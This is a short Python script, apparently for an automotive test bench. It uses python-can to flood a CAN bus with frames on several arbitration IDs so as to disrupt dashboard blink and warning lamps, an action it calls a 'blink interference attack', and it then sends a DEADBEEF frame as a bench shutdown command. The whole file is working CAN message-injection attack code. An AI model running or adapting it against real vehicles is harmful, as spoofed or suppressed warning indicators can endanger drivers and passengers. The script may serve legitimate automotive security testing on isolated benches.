#!/usr/bin/env python3
"""Flood console-indicator CAN IDs to disrupt blink / warning lamps on the bench."""

import os
import signal
import sys
import time

import can

CAN_INTERFACE = "can0"
BITRATE = 500000

try:
    bus = can.interface.Bus(
        channel=CAN_INTERFACE, interface="socketcan", bitrate=BITRATE
    )
except Exception as exc:
    print(f"Failed to connect to CAN interface: {exc}")
    sys.exit(1)


def signal_handler(sig, frame):
    print("Stopping blink interference attack...")
    bus.shutdown()
    shutdown_bench_test()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def blink_interference_attack(duration=10):
    print("Starting blink interference attack on the CAN bus...")
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            msg1 = can.Message(arbitration_id=0x1F8, data=[0xFF], is_extended_id=False)
            msg2 = can.Message(
                arbitration_id=0x1C9,
                data=[0x00, 0xFF, 0x00, 0xFF],
                is_extended_id=False,
            )
            msg3 = can.Message(
                arbitration_id=0x415, data=[0xAB, 0xCD, 0xEF], is_extended_id=False
            )
            bus.send(msg1)
            bus.send(msg2)
            bus.send(msg3)
            time.sleep(0.05)
    except can.CanError as exc:
        print(f"CAN error: {exc}")
    print("Blink interference attack completed.")


def shutdown_bench_test():
    print("Sending shutdown command to bench test system...")
    try:
        shutdown_message = can.Message(
            arbitration_id=0x123,
            data=[0xDE, 0xAD, 0xBE, 0xEF],
            is_extended_id=False,
        )
        bus.send(shutdown_message)
        print("Shutdown command sent successfully.")
    except can.CanError as exc:
        print(f"Failed to send shutdown command: {exc}")


if __name__ == "__main__":
    print("Entering sleep mode before starting the attack...")
    time.sleep(5)
    blink_interference_attack(duration=10)
    shutdown_bench_test()
    bus.shutdown()
